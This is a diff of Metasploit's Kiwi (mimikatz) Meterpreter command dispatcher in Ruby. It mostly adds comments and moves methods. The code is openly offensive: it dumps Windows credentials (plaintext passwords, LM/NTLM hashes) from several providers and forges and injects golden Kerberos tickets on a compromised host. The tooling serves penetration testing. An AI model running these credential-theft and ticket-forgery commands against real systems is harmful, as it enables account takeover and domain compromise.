@@ -14,6 +14,7 @@ module Ui
 # http://blog.gentilkiwi.com/mimikatz
 #
 # extension converted by OJ Reeves (TheColonial)
+#
 ###
 class Console::CommandDispatcher::Kiwi
 
@@ -22,7 +23,16 @@ class Console::CommandDispatcher::Kiwi
   include Console::CommandDispatcher
 
   #
-  # Initializes an instance of the priv command interaction.
+  # Name for this dispatcher
+  #
+  def name
+    "Kiwi"
+  end
+
+  #
+  # Initializes an instance of the priv command interaction. This function
+  # also outputs a banner which gives proper acknowledgement to the original
+  # author of the Mimikatz 2.0 software.
   #
   def initialize(shell)
     super
@@ -63,36 +73,9 @@ class Console::CommandDispatcher::Kiwi
     }
   end
 
-  def scrape_passwords(provider, method)
-    get_privs
-    print_status("Retrieving #{provider} credentials")
-    accounts = method.call
-
-    table = Rex::Ui::Text::Table.new(
-      'Header' => "#{provider} credentials",
-      'Indent' => 0,
-      'SortIndex' => 4,
-      'Columns' =>
-      [
-        'Domain', 'User', 'Password', 'Auth Id', 'LM Hash', 'NTLM Hash'
-      ]
-    )
-
-    accounts.each do |acc|
-      table << [
-        acc[:domain],
-        acc[:username],
-        acc[:password],
-        "#{acc[:auth_hi]} ; #{acc[:auth_lo]}",
-        acc[:lm],
-        acc[:ntlm]
-      ]
-    end
-
-    print_line table.to_s
-    return true
-  end
-
+  #
+  # Invoke the LSA secret dump on thet target.
+  #
   def cmd_lsa_dump(*args)
     get_privs
 
@@ -148,6 +131,9 @@ class Console::CommandDispatcher::Kiwi
     print_line
   end
 
+  #
+  # Invoke the golden kerberos ticket creation functionality on the target.
+  #
   def cmd_golden_ticket_create(*args)
     if args.length != 5
       print_line("Usage: golden_ticket_create user domain sid tgt ticketpath")
@@ -166,12 +152,18 @@ class Console::CommandDispatcher::Kiwi
     print_good("Golden Kerberos ticket written to #{target}")
   end
 
+  #
+  # Valid options for the ticket listing functionality.
+  #
   @@kerberos_ticket_list_opts = Rex::Parser::Arguments.new(
     "-h" => [ false, "Help banner" ],
     "-e" => [ false, "Export Kerberos tickets to disk" ],
     "-p" => [ true,  "Path to export Kerberos tickets to" ]
   )
 
+  #
+  # Output the usage for the ticket listing functionality.
+  #
   def kerberos_ticket_list_usage
     print(
       "\nUsage: kerberos_ticket_list [-h] [-e <true|false>] [-p <path>]\n\n" +
@@ -179,6 +171,9 @@ class Console::CommandDispatcher::Kiwi
       @@kerberos_ticket_list_opts.usage)
   end
 
+  #
+  # Invoke the kerberos ticket listing functionality on the target machine.
+  #
   def cmd_kerberos_ticket_list(*args)
     if args.include?("-h")
       kerberos_ticket_list_usage
@@ -243,11 +238,17 @@ class Console::CommandDispatcher::Kiwi
     return true
   end
 
+  #
+  # Invoke the kerberos ticket purging functionality on the target machine.
+  #
   def cmd_kerberos_ticket_purge(*args)
     client.kiwi.keberos_ticket_purge
     print_good("Kerberos tickets purged")
   end
 
+  #
+  # Use a locally stored Kerberos ticket in the current session.
+  #
   def cmd_kerberos_ticket_use(*args)
     if args.length != 1
       print_line("Usage: kerberos_ticket_use ticketpath")
@@ -264,40 +265,63 @@ class Console::CommandDispatcher::Kiwi
     print_good("Kerberos ticket applied successfully")
   end
 
+  #
+  # Dump all the possible credentials to screen.
+  #
   def cmd_creds_all(*args)
     method = Proc.new { client.kiwi.all_pass }
     scrape_passwords("all", method)
   end
 
+  #
+  # Dump all wdigest credentials to screen.
+  #
   def cmd_creds_wdigest(*args)
     method = Proc.new { client.kiwi.wdigest }
     scrape_passwords("wdigest", method)
   end
 
+  #
+  # Dump all msv credentials to screen.
+  #
   def cmd_creds_msv(*args)
     method = Proc.new { client.kiwi.msv }
     scrape_passwords("msv", method)
   end
 
+  #
+  # Dump all LiveSSP credentials to screen.
+  #
   def cmd_creds_livessp(*args)
     method = Proc.new { client.kiwi.livessp }
     scrape_passwords("livessp", method)
   end
 
+  #
+  # Dump all SSP credentials to screen.
+  #
   def cmd_creds_ssp(*args)
     method = Proc.new { client.kiwi.ssp }
     scrape_passwords("ssp", method)
   end
 
+  #
+  # Dump all TSPKG credentials to screen.
+  #
   def cmd_creds_tspkg(*args)
     method = Proc.new { client.kiwi.tspkg }
     scrape_passwords("tspkg", method)
   end
 
+  #
+  # Dump all Kerberos credentials to screen.
+  #
   def cmd_creds_kerberos(*args)
     method = Proc.new { client.kiwi.kerberos }
     scrape_passwords("kerberos", method)
   end
+
+protected
 
   def get_privs
     unless system_check
@@ -323,11 +347,43 @@ class Console::CommandDispatcher::Kiwi
   end
 
   #
-  # Name for this dispatcher
+  # Infoke the password scraping routine on the target.
   #
-  def name
-    "Kiwi"
+  # +provider+ [String] - The name of the type of credentials to dump (used for
+  #   display purposes only).
+  # +method+ [Block] - Block that contains a call to the method that invokes the
+  #   appropriate function on the client that returns the results from Meterpreter.
+  #
+  def scrape_passwords(provider, method)
+    get_privs
+    print_status("Retrieving #{provider} credentials")
+    accounts = method.call
+
+    table = Rex::Ui::Text::Table.new(
+      'Header' => "#{provider} credentials",
+      'Indent' => 0,
+      'SortIndex' => 4,
+      'Columns' =>
+      [
+        'Domain', 'User', 'Password', 'Auth Id', 'LM Hash', 'NTLM Hash'
+      ]
+    )
+
+    accounts.each do |acc|
+      table << [
+        acc[:domain],
+        acc[:username],
+        acc[:password],
+        "#{acc[:auth_hi]} ; #{acc[:auth_lo]}",
+        acc[:lm],
+        acc[:ntlm]
+      ]
+    end
+
+    print_line table.to_s
+    return true
   end
+
 end
 
 end
